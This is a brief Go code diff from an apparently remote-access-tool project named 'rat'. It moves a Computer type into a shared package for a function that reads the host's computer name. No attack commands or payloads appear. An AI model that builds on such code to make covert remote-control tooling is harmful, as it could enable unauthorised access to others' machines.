@@ -9,12 +9,12 @@ import "C"
 import (
 	"os/exec"
 	"rat/client/utils"
-
+	"rat/shared"
 	"unsafe"
 )
 
-func GetComputerInformation() Computer {
-	info := Computer{}
+func GetComputerInformation() shared.Computer {
+	info := shared.Computer{}
 
 	// UNLEN is less than MAX_COMPUTERNAME_LENGTH (Lmcons.h)
 	const BufferSize = C.MAX_COMPUTERNAME_LENGTH + 1
